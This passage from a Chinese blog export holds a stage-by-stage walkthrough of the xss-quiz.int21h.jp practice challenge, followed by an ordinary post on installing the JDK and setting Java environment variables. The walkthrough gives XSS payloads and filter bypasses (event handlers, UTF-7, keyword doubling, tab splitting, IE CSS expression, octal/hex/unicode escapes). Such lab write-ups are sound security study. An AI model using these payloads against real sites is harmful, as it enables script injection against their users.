class="name">option</span>&gt;</span>United Kingdom<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span>We couldn't find any places called <span class="tag">&lt;<span class="name">b</span>&gt;</span>"&amp;lt;&amp;gt;"<span class="tag">&lt;/<span class="name">b</span>&gt;</span> in <span class="tag">&lt;<span class="name">b</span>&gt;</span>Japan<span class="tag">&lt;/<span class="name">b</span>&gt;</span>.<span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到特殊字符，被转译为<code>&amp;lt;&amp;gt;</code>等html字符。<br><br>卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！</p>
<p>修改dom：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p2.childNodes[<span class="number">1</span>].innerHtml = <span class="string">'&lt;script&gt;alert(document.domain);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>
<p>发现innerHTML不能插入js，我需要js字符串，而不是代码，那么可以用innerText属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p2.childNodes[<span class="number">1</span>].innerText = <span class="string">'&lt;script&gt;alert(document.domain);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>
<p>这样，select的第一个选项已经被修改，接下来随便输入并提交，ok。</p>
<h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242</a></p>
</blockquote>
<p>此时，select和input均作了过滤，都不能进行注入，但是查看发现，有隐藏输入框，可以尝试注入。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p3.value = <span class="string">'"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>
<h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc</a></p>
</blockquote>
<p>长度限制，发现限制了文本输入长度，但只在表面上做了限制。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p1.maxlength = <span class="number">100</span></span><br></pre></td></tr></table></figure>
<p>修改输入框输入内容长度限制。然后注入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p1.value = <span class="string">'"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;"'</span></span><br></pre></td></tr></table></figure>
<h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999</a></p>
</blockquote>
<p>我还是太弱鸡了，竟然看了答案，这题还是比较好分析的。<br><br>输入特殊字符发现：<code>&quot;</code>未被过滤，可以截断value输入，但是字符 <code>&lt;&gt;</code> 被转译。<br><br>仍存在注入。<br><br>通过添加事件注入！<br></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.domain);</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.domain);<span class="string">"</span></span><br></pre></td></tr></table></figure>
<p>==================Don’t look boring==========================</p>
<p>Ps:<br></p>
<blockquote>
<p>当使用XSS时，分为三种类型:<br><br><strong>A</strong>:直接注入，可以截断属性，注入事件。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Script tags: <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">" ;&gt;</span></span></span></span><br><span class="line">Event handler attributes: &lt;body onload="alert('xss')"&gt;</span><br><span class="line">CSS: &lt;p style="background:url('javascript:alert(1)')"&gt;</span><br><span class="line">URLs:&lt;img src="javascript:alert('XSS')"&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>B</strong>.Proprietary extensions to HTML private development<br>私人开发专有扩展HTML，<strong>主要是针对只支持IE浏览器的私有标签！</strong></p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">XML data islands(IE) :</span><br><span class="line">&lt;xml src=<span class="string">" ; id="</span>x<span class="string">"&gt;</span></span><br><span class="line">&lt;span datasrc="#x" datafld="c" dataformatas="html"&gt;</span><br></pre></td></tr></table></figure>
<p>XML data islands(IE)(数据岛)(<a href="http://www.w3school.com.cn/xml/xml_dont.asp" target="_blank" rel="noopener">使用</a>)：</p>
<blockquote>
<p>1.是嵌入 HTML 页面中的 XML 数据。<br><br>2.XML 数据岛只在 Internet Explorer 浏览器中有效。<br></p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">JavaScript expressions <span class="keyword">in</span> attribute(NS4):</span><br><span class="line">&lt;p id=<span class="string">"&amp;&#123;alert('XSS')&#125;"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>​<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Conditional comments(IE)</span><br><span class="line">&lt;!--[<span class="keyword">if</span> gte IE <span class="number">4</span>]&gt;</span><br><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>Conditional comments(条件注释)：定义了一些通过IE执行的HTML标记</p>
<h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2</a></p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus=alert(document.domain);</span></span><br></pre></td></tr></table></figure>
<p>上面第六关还是能注入，不知道后台验证怎么处理的？</p>
<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5</a></p>
</blockquote>
<p>当浏览器载入一个Javascript URL时，它会执行URL中所包含的Javascript代码。</p>
<blockquote>
<p>javascript:alert(document.domain);</p>
</blockquote>
<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9</a></p>
</blockquote>
<p>查看源码，发现提交数据时，带有一行数据编码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=<span class="number">50</span> name=p1&gt;</span><br><span class="line">&lt;INPUT type=hidden value=euc-jp name=charset&gt;</span><br></pre></td></tr></table></figure>
<p>可以利用了IE对于UTF-7的漏洞，过滤对于UTF-7的不支持，以及IE对于UTF-7的漏洞！</p>
<h2 id="UTF-7"><a href="#UTF-7" class="headerlink" title="UTF-7"></a>UTF-7</h2><blockquote>
<p>用以将Unicode字符以ASCII编码的字符串来呈现。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;INPUT name=<span class="string">"charset"</span> type=<span class="string">"hidden"</span> value=<span class="string">"utf-7"</span> &gt;</span><br></pre></td></tr></table></figure>
<p>将</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.domain);</span><br></pre></td></tr></table></figure>
<p>utf-7编码为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">+ACI onfocus+AD0AIg-alert(<span class="built_in">document</span>.domain)+ADs-</span><br></pre></td></tr></table></figure>
<p>这个编码网站挺全的：</p>
<p><strong><a href="http://toolswebtop.com/text/process/encode" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode</a></strong>(<a href="http://toolswebtop.com/text/process/encode" target="_blank" rel="noopener">点击</a>)</p>
<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3</a></p>
</blockquote>
<p>发现过滤了domain关键字，关键词过滤，一定是用了正则表达式，那么怎么过正则表达式？</p>
<blockquote>
<p>例如他过滤了“domain”关键字，那么只要domain出现，就会被替换，那么可以在domain关键字中间再加一个，组成“dodomainmain”，这样中间的domain被过滤，剩下的部分组成domain，这样就越过了！（好机智！）</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.dodomainmain)<span class="string">"</span></span><br></pre></td></tr></table></figure>
<h1 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83</a></p>
</blockquote>
<p>输入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.dodomainmain)<span class="string">"</span></span><br></pre></td></tr></table></figure>
<p>查看页面源码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=<span class="number">50</span> name=p1 ? onxxx=<span class="string">"alert(document.dodomainmain)"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>查看提示：</p>
<blockquote>
<p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;” </p>
<p>说明过滤了<code>on.*</code>等一大部分， <code>s.*</code>和<code>script.</code>会变成<code>&lt;xscript&gt;</code> </p>
<h2 id="制表符越过"><a href="#制表符越过" class="headerlink" title="制表符越过"></a>制表符越过</h2><p>输入：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(<span class="built_in">document</span>.domain);<span class="string">"&gt;XSS&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码发现：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;A href=<span class="string">"javaxscript:alert(document.domain);"</span>&gt;XSS&lt;<span class="regexp">/A&gt;</span></span><br></pre></td></tr></table></figure>
<p>加入制表符：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascri	p	t:alert(<span class="built_in">document</span>.domain)<span class="string">";&gt;XSS&lt;/a&gt; //OK</span></span><br></pre></td></tr></table></figure>
<p>过了！</p>
<p>疑惑：<br>为什么</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" on&amp;#x09;focus="</span>alert(<span class="built_in">document</span>.dodomainmain)<span class="string">"</span></span><br></pre></td></tr></table></figure>
<p>过不去？</p>
<p>显示：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus="alert(document.dodomainmain)"&gt;</span><br></pre></td></tr></table></figure>
<p>但是，如果输入</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">" on&amp;#x09;focus="al&amp;#x09;ert(document.dodomainmain)"</span><br></pre></td></tr></table></figure>
<p>显示：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus="al&amp;#9;ert(document.dodomainmain)"&gt;</span><br></pre></td></tr></table></figure>
<p>这个HTML的转义应该是针对字符串的;</p>
<p>总结：以后尽量把结果引<code>&lt;a href=&quot;&quot;&gt;&lt;/a&gt;</code>。</p>
<h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988</a></p>
</blockquote>
<p>发现，<code>&lt;&gt;``&quot;&quot;</code>单独使用并未过滤，但是<code>&lt;script&gt;</code>、<code>alert</code>是被过滤了</p>
<p>再看Hint：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"s/[\x00-\x20\&lt;\&gt;\"\']//g;"</span></span><br></pre></td></tr></table></figure>
<p><code>x00~x20</code>都被过滤，制表符无法使用了！，同样，<code>&lt;&gt; &quot;  &#39;</code>都被滤了！</p>
<h2 id="利用IE-的漏洞"><a href="#利用IE-的漏洞" class="headerlink" title="利用IE ``的漏洞"></a>利用IE ``的漏洞</h2><p>IE对于反单引号没有很好的过滤，使用  ``  可以很轻松的截断输入，但是在google下测试，发现 `` 被过滤了。<br>&gt;</p>
<blockquote>
<p><font color="red"><strong>`</strong></font>:反单引号，上排数字键1的前面，其上档符号是“~ ”</p>
</blockquote>
<p>可以截断输入，那就好办了！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">``</span> onfocus=<span class="string">"alert(document.domain);"</span>  <span class="comment">//IE下可行</span></span><br></pre></td></tr></table></figure>
<h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6</a></p>
</blockquote>
<p>如何在CSS样式中利用expression实现JavaScript中的onmouseover/onmouseout事件。<br><br>很奇怪，在ie11上，答案也不能成功，但是换了虚拟机里的IE8，成功。<br><br><strong>说明这个expression是一个浏览器兼容性的问题</strong>，解决这类兼容性xss漏洞，使用ie6即以下，效果可能更好！<br><br>附答案：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:expression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在CSS样式中注入这段代码就能弹了。。<br><br>但是现实环境中怎么可能有如此简单就能插入的地方。。<br><br>很难找到的说。。<br><br>话说，现实中怎么利用呢？<br><br>有2种注入：<br></p>
</blockquote>
<p>(1)@import 和 expression<br></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">import</span> <span class="string">"http://web/xss.css"</span>  </span><br><span class="line">@<span class="keyword">import</span> <span class="string">'javascript:alert("xss")'</span>  </span><br><span class="line">body&#123;<span class="attr">xss</span>:expression(alert(<span class="string">'xss'</span>))]  </span><br><span class="line">&lt;img style=<span class="string">"xss:expression(alert('xss'))"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>(2)css代码中js，vs脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">body&#123;backgroud-image:url(javascript:alert(<span class="string">'xss'</span>))&#125;  </span><br><span class="line">body&#123;backgroud-image:url(vbscript:msgbox(<span class="string">'xss'</span>))&#125;</span><br></pre></td></tr></table></figure>
<h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8</a></p>
<p>发现expression关键字被正则了！绕过<strong>(IE8即以下！)</strong>：<br></p>
</blockquote>
<p>1.编码绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:\<span class="number">0065</span>xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ERROR</span><br></pre></td></tr></table></figure>
<p>2.<code>\</code> 绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:e\xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ERROR</span><br></pre></td></tr></table></figure>
<p>3.<code>\0</code> 绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:e\<span class="number">0</span>xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ok</span><br></pre></td></tr></table></figure>
<p>4.<code>\**\</code>绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:e\**\xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ERROR</span><br></pre></td></tr></table></figure>
<p>5.<code>/**/</code>绕过</p>
<blockquote>
<p>好像是注解绕过</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:e<span class="comment">/**/</span>xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ok</span><br></pre></td></tr></table></figure>
<p><strong><font color="orange"><code>\uxxxx</code>这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 <code>\u5c0f</code> 表示汉语中的 ‘小’字，转换成10进制就是9215，所以在byte数组中应该是1592.</font></strong></p>
<h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1</a></p>
</blockquote>
<p>输入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码查看，不是审查元素</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">"&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;"</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>可以看到 <code>&lt; &gt;</code>这两个字符被替换为<code>&quot;&amp;lt;</code>和<code>&amp;gt</code>;，说明有过滤！</p>
<p>由于此页使用<code>document.write(value)</code>，来写出内容，所以肯定存在注入！</p>
<p>控制台</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert(<span class="string">"\u003c"</span>) <span class="comment">//显示符号 &lt;</span></span><br><span class="line">\u0061lert(<span class="string">"123"</span>) <span class="comment">//123</span></span><br></pre></td></tr></table></figure>
<p>JS支持这种写法，此处注入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\<span class="number">74</span>script\\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\\<span class="number">74</span>/script\\<span class="number">76</span></span><br></pre></td></tr></table></figure>
<p>能成功的原因在于使用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write();</span><br></pre></td></tr></table></figure>
<p>执行了js，将字符串编译了！</p>
<h2 id="JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt"><a href="#JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt" class="headerlink" title="JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;参见&gt;"></a>JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;<a href="http://www.cnblogs.com/ecalf/archive/2012/09/04/unicode.html" target="_blank" rel="noopener">参见</a>&gt;</h2><blockquote>
<p><strong>所有的ASCII码都可以用<code>\</code>加数字（一般是8进制数字）来表示。<code>\x</code>表示后面的字符是十六进制数，<code>\</code>表示后面的字符是八进制数。</strong><br> </p>
</blockquote>
<p>八进制（<code>\</code>+八进制）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\<span class="number">74</span>script\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\<span class="number">74</span>/script\<span class="number">76</span></span><br></pre></td></tr></table></figure>
<p>十六进制</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\x3cscript\x3ealert(<span class="built_in">document</span>.domain);\x3c/script\x3e</span><br></pre></td></tr></table></figure>
<p>发现过滤了单个 <code>\</code></p>
<p>Octonary：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\<span class="number">74</span>script\\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\\<span class="number">74</span>/script\\<span class="number">76</span></span><br></pre></td></tr></table></figure>
<p>Hexadecimal</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\x3cscript\\x3ealert(<span class="built_in">document</span>.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure>
<p><strong>Unicode</strong>好像也可以！</p>
<blockquote>
<p><code>\u</code> 加 4个16进制字符表示一个字符的编码</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(<span class="built_in">document</span>.domain);\\u003c/script\\u003e</span><br></pre></td></tr></table></figure>
<h1 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d</a></p>
</blockquote>
<p>过滤了十六进制，我们还有八进制和unicode</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(<span class="built_in">document</span>.domain);\\u003c/script\\u003e</span><br><span class="line"></span><br><span class="line">\\<span class="number">74</span>script\\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\\<span class="number">74</span>/script\\<span class="number">76</span></span><br></pre></td></tr></table></figure>
<h2 id="第十七十八（UNSOLVED）"><a href="#第十七十八（UNSOLVED）" class="headerlink" title="第十七十八（UNSOLVED）"></a>第十七十八（UNSOLVED）</h2><blockquote>
<p>需要配合IE6即以下浏览器解决！</p>
</blockquote>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习1 - JDK下载及JAVA环境搭建</title>
    <url>/2015/08/01/Java%E5%AD%A6%E4%B9%A01-%E6%8A%80%E6%9C%AF%E4%B8%BA%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98%E8%80%8C%E7%94%9F/</url>
    <content><![CDATA[<p>—————————————————–更新于2020年2月28日—————————————————–</p>
<h2 id="一、JDK-Java-Development-Kit"><a href="#一、JDK-Java-Development-Kit" class="headerlink" title="一、JDK(Java Development Kit)"></a>一、JDK(Java Development Kit)</h2><p>Java 语言的软件开发工具包(SDK)，包括JRE和JDK（Java开发工具集）。主要包括以下几个版本：</p>
<ul>
<li><p>SE(J2SE)，Standard Edition，标准版，主要是桌面应用开发。</p>
</li>
<li><p>EE(J2EE)，Enterprise Edition，企业版，主要是Web开发。</p>
</li>
<li><p>ME(J2ME)，Micro Edition，主要是移动平台开发。</p>
</li>
</ul>
<p>SUN公司，由斯坦福大学网络（<strong>S</strong>tanford <strong>U</strong>niversity <strong>N</strong>etwork）缩写而来。虽作为一代传奇，但也最终倒在了互联网的浪潮下（09年被甲骨文<a href="https://www.oracle.com/index.html" target="_blank" rel="noopener">Oracle公司</a>收购）。</p>
<a id="more"></a>
<p>现在整体的下载环境也有所改变，但直观上很容易看到想下载的内容的。</p>
<p>下载地址：<a href="https://www.oracle.com/java/technologies/javase-downloads.html" target="_blank" rel="noopener">Oracle官方下载地址</a><br><img style="width:500px;height:200px;" src="/images/JDK1.PNG"><br>官网下载固然安全可靠，但是由于国内环境等因素，也有可能访问很慢。那么可以基于国内<strong>开源镜像</strong>（可以理解为由一些组织维护的官方备份）下载，提供一个下载渠道：</p>
<ul>
<li><a href="https://mirrors.huaweicloud.com/java/jdk/" target="_blank" rel="noopener">华为JDK镜像下载</a></li>
</ul>
<p>安装比较简单，需要注意，对于比较旧版本的安装（JDK8及一下），JDK安装完后可能会弹出<strong>JRE</strong>（Java Runtime Environment）安装，注意JRE可以不安装，它是Java的运行环境，JDK中已经包含，是JDK的子集。</p>
<p><img src="/images/JRE和JDK.webp"></p>
<h2 id="二、环境变量配置"><a href="#二、环境变量配置" class="headerlink" title="二、环境变量配置"></a>二、环境变量配置</h2><p><strong>什么是环境变量？</strong></p>
<blockquote>
<p>告诉系统在哪里可以使用java javac等操作命令去操作.java .class等Java等相关文件。以windows为例，在命令行操作中，不配置环境变量而直接输入java会提示找不到指令，而配置后系统会去相应路径寻找操作程序。</p>
</blockquote>
<p>一般来说，使用安装方式会自动配置环境变量，但是如果是解压缩等方式获得JDk（常见于基于Linux内核的系统），就需要手动配置环境变量了。</p>
<p><strong>如何配置环境变量？（以win10为例）</strong></p>
<ul>
<li><p>右键我的电脑，<code>属性–&gt;系统设置–&gt;高级–&gt;环境变量</code>，会出现两个上下栏，上栏的配置只会影响当前用户的环境配置，也就是说你新建一个用户，那么你的环境变量需要重新配置；下栏的配置会影响系统的环境变量，也就是说新建一个用户，那么环境变量是不变的。</p>
</li>
<li><p>我选择在上栏用户下配置：<br>若有Path变量名，则点击<code>编辑-&gt;新建</code>添加java的bin文件夹路径即可；<br>若没有则需要新建。</p>
<p>注意：Path的添加不是同步生效，需要重新打开命令行窗口测试。</p>
</li>
</ul>
<p><strong>灵活使用环境变量</strong></p>
<ul>
<li><strong>win10以前</strong>的环境变量Path，所有配置的值是在一行的，所以会出现万一删错了，或者多加了几个符号可就不灵了的情况。所以衍生出了一些操作：</li>
<li><p>在环境变量下，新建一个变量名为<code>JAVA_HOME</code>，变量值为：<code>D:\Important Soft\Java\bin</code>，然后再Path路径下添加<code>%JAVA-HOME%</code>（<code>%***%</code>意思是动态的获取某一个已存在的环境变量的值）</p>
</li>
<li><p>这种设置的好处，我的JDK路径要是更改了，我不用动Path的值，更改<code>JAVA-HOME</code>的值就好了，对Path的操作越少，那么可能出现的错误也会比较少。</p>
</li>
<li><p>出了一点小问题，需要到朋友电脑上运行一下某一个编译好的class文件，又不想费时间和空间去在朋友电脑上装JDK，怎么办呢？</p>
<blockquote>
<p>弄个临时的配置不就好了，先找个U盘或者硬盘，把我这安装好的JDK文件夹全部装进去，插到朋友电脑上。<br>进cmd，输入”set Path”以及”java -version”，发现java是不能用的（因为环境变良没配置）。<br>此时可以选择使用CMD配置临时环境变量，然后输入”set Path=u盘盘符:\java\bin;%Path%”。<br>但是，这个是有限制的，你如果退出当前cmd，则你的配置就会消失，所以这是临时配置，适合的场合也是特殊情况，但是这是简单有效而又不留痕迹的方式。<br>注：后面为什么加%Path%，为了不覆盖以前的Path配置，只是在原Path上添加。</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
</search>
